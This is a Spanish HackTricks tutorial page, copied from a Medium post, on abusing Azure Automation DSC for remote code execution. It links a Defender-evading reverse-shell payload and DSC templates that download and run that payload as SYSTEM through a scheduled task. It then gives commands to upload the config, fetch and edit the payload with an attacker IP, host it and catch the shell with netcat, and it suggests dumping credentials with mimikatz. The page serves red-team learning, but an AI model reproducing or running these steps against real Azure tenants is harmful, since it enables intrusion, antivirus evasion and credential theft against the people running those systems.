# Az - State Configuration RCE

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Este post fue copiado de** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Preparaci√≥n de la Infraestructura del Servidor Remoto (C2) <a href="#f0fa" id="f0fa"></a>

Estar√© alojando una versi√≥n simplificada del payload Nishang Invoke-PowerShellTcp.ps1 desde el servidor remoto "40.84.7.74", que es la caja de Kali. El nombre del payload ser√° "RevPS.ps1". Para evitar que el script de Nishang sea eliminado por Windows Defender por cualquier motivo (quiz√°s prefieras dejar el archivo en el disco), aqu√≠ tienes una versi√≥n ligera que puedes usar y que evitar√° a Defender: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1). Esto ser√° alojado por un simple Servidor Python Simple en la caja de Kali.

### Paso 1 ‚Äî Crear Archivos <a href="#89de" id="89de"></a>

Necesitaremos crear otro archivo de configuraci√≥n DSC. Una plantilla se puede descargar aqu√≠: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1). Este archivo de configuraci√≥n utilizar√° la misma funci√≥n de escritura de archivos que usamos anteriormente. Esta vez, el contenido incluye c√≥digo para descargar y ejecutar un payload desde nuestro servidor remoto. Adem√°s, estamos utilizando una funci√≥n de tarea programada disponible desde el m√≥dulo _ComputerManagementDsc_. La funci√≥n de tarea programada jugar√° un papel clave en la ejecuci√≥n y nos proporcionar√° privilegios de SYSTEM m√°s adelante.

Tambi√©n descargaremos un script que se utilizar√° para publicar nuestra configuraci√≥n en la VM. Se encuentra aqu√≠: [https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).

Estos archivos servir√°n como plantilla. **Necesitar√°s completar los nombres de las variables y los par√°metros con lo que est√©s utilizando**. Esto incluye los nombres de los recursos, las rutas de los archivos y los nombres del servidor/payload externo que est√©s utilizando. Por favor, consulta los comentarios en el c√≥digo.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

### Paso 2 ‚Äî Comprimir el Archivo de Configuraci√≥n <a href="#c2c2" id="c2c2"></a>

Con nuestros dos archivos creados, comprimiremos el archivo **‚Äòreverse\_shell\_config.ps1‚Äô** para que pueda ser enviado a la Cuenta de Almacenamiento
```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### Paso 3 ‚Äî Establecer Contexto de Almacenamiento y Subir <a href="#bed9" id="bed9"></a>

De nuevo, configuraremos el contexto de nuestra Cuenta de Almacenamiento, lo cual ya he hecho. Ya tengo un contenedor llamado '**azure-pentest**', as√≠ que aqu√≠ es donde publicar√© el m√≠o:
```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
### Paso 4 ‚Äî Preparar Kali Box <a href="#20fb" id="20fb"></a>

En nuestra Kali box, podemos simplemente usar _wget_ para obtener nuestro payload de PowerShell. El script de reverse-shell en bruto se encuentra aqu√≠: [https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1).
```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
```markdown
<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

Necesitamos editar el script de reverse-shell a√±adiendo nuestros par√°metros, para que la VM de Windows sepa a d√≥nde conectarse una vez que se ejecute. En mi caso a√±ado lo siguiente:
```
```
RevPShell -Reverse 40.84.7.73 443
```
### Paso 5 ‚Äî Publicar Archivo de Configuraci√≥n <a href="#9ad6" id="9ad6"></a>

Ahora ejecutaremos nuestro archivo de configuraci√≥n. Tengo el m√≠o configurado para ser publicado en el Escritorio para una mejor visualizaci√≥n, sin embargo, puede ser publicado casi en cualquier lugar. Despu√©s de un par de minutos, veremos que el script de reverse-shell ¬°ha sido publicado!

### Paso 6 ‚Äî Alojar Payload y Configurar Listener <a href="#c55f" id="c55f"></a>

Una vez que publiquemos la configuraci√≥n, podemos iniciar simult√°neamente un Python SimpleHTTPServer sobre el puerto 80 para alojar el payload, junto con un listener de netcat para capturar la conexi√≥n:
```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```
Observamos que la tarea programada se ha ejecutado y nuestro payload fue recuperado y ejecutado en memoria con privilegios de nivel **SYSTEM**.

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### Conclusi√≥n <a href="#1ec2" id="1ec2"></a>

Esto abre la puerta a muchas posibilidades. Dado que tenemos una shell ejecut√°ndose como **SYSTEM**, podemos volcar credenciales con mimikatz (potencialmente arriesgado dependiendo de la madurez del EDR para recursos en la nube). Si volcas credenciales, hay una buena posibilidad de que estas puedan reutilizarse en diferentes recursos. Por √∫ltimo, una gran lecci√≥n es que, en lugar de limitar esto a una VM, ahora tienes la capacidad de aplicar potencialmente esta configuraci√≥n en m√∫ltiples VMs.

Con esto, concluimos nuestras aventuras con Azure Automation DSC. ¬°Espero que te hayas divertido, aprendido mucho y contin√∫es expandiendo con tu propia creatividad!

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
